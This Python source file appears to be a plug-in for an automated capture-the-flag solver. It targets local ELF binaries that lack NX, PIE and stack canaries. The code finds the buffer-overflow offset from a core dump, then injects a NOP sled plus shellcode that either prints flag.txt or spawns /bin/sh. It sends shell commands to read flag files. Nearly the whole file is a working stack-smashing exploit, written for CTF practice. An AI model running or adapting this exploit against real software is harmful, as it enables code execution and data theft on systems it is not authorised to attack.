"""
Shellcode injection for NX-disabled binaries.

This unit detects ELF binaries with NX disabled and executable stack,
then attempts to exploit buffer overflows by injecting shellcode
directly onto the stack.

Ported from autorop concepts - targeting the simplest exploitation path.
"""

import os
import stat
from typing import Any

from flagr.unit import NotApplicable
from flagr.units.pwn import PwnUnit


class Unit(PwnUnit):

    GROUPS = ["pwn", "elf", "shellcode", "exploit"]
    PRIORITY = 25
    RECURSE_SELF = False

    def __init__(self, *args, **kwargs):
        super(Unit, self).__init__(*args, **kwargs)

        try:
            from pwn import ELF
            self._elf = ELF(self.target.path, checksec=False)
        except Exception:
            raise NotApplicable("could not parse ELF")

        if self._elf.pie:
            raise NotApplicable("PIE binary")

        # Only exploit if NX is disabled (executable stack)
        if getattr(self._elf, 'nx', True):
            raise NotApplicable("NX enabled - shellcode won't execute on stack")

        # Need no canary for simple overflow
        if getattr(self._elf, 'canary', False):
            raise NotApplicable("stack canary present")

    def evaluate(self, case: Any):
        """
        Exploit NX-disabled binary with shellcode injection:
        1. Find buffer overflow offset
        2. Inject shellcode + NOP sled
        3. Return to stack address
        """
        os.environ["PWNLIB_NOTERM"] = "1"
        from pwn import process, cyclic, cyclic_find, context, asm, shellcraft

        context.binary = self._elf
        context.log_level = "error"

        st = os.stat(self.target.path)
        os.chmod(self.target.path, st.st_mode | stat.S_IEXEC)

        try:
            binary_path = os.path.realpath(self.target.path)

            # Step 1: Find offset
            p = process(binary_path)
            pattern = cyclic(1024, n=context.bytes)
            p.sendline(pattern)
            p.wait(timeout=5)

            corefile = p.corefile
            if corefile is None:
                p.close()
                return

            offset = cyclic_find(corefile.fault_addr, n=context.bytes)
            # Get stack pointer from corefile for return address
            rsp = corefile.sp if hasattr(corefile, 'sp') else corefile.esp
            p.close()

            if not offset or offset <= 0 or offset >= 10000:
                return

            # Step 2: Build shellcode payload
            # Use cat flag* || /bin/sh approach
            if context.bits == 64:
                shellcode = asm(shellcraft.amd64.linux.cat("flag.txt") + shellcraft.amd64.linux.exit(0))
            else:
                shellcode = asm(shellcraft.i386.linux.cat("flag.txt") + shellcraft.i386.linux.exit(0))

            # NOP sled + shellcode + padding + return address
            nop_sled = b"\x90" * 64
            payload_code = nop_sled + shellcode
            padding = b"A" * (offset - len(payload_code))

            if len(payload_code) > offset:
                # Shellcode doesn't fit before return address
                return

            # Return to somewhere in the NOP sled on stack
            ret_addr = rsp + 64  # Approximate stack location

            if context.bits == 64:
                from pwn import p64
                payload = payload_code + padding + p64(ret_addr)
            else:
                from pwn import p32
                payload = payload_code + padding + p32(ret_addr)

            # Step 3: Send exploit
            p = process(binary_path)
            p.sendline(payload)

            try:
                output = p.recvall(timeout=3)
                if output:
                    self.manager.register_data(self, output)
            except Exception:
                pass
            finally:
                p.close()

            # Also try with /bin/sh shellcode
            if context.bits == 64:
                shellcode2 = asm(shellcraft.amd64.linux.sh())
            else:
                shellcode2 = asm(shellcraft.i386.linux.sh())

            payload_code2 = nop_sled + shellcode2
            if len(payload_code2) <= offset:
                padding2 = b"A" * (offset - len(payload_code2))
                if context.bits == 64:
                    payload2 = payload_code2 + padding2 + p64(ret_addr)
                else:
                    payload2 = payload_code2 + padding2 + p32(ret_addr)

                p = process(binary_path)
                p.sendline(payload2)
                try:
                    p.sendline(b"cat flag* 2>/dev/null; cat /flag* 2>/dev/null")
                    output = p.recvall(timeout=3)
                    if output:
                        self.manager.register_data(self, output)
                except Exception:
                    pass
                finally:
                    p.close()

        except Exception:
            pass
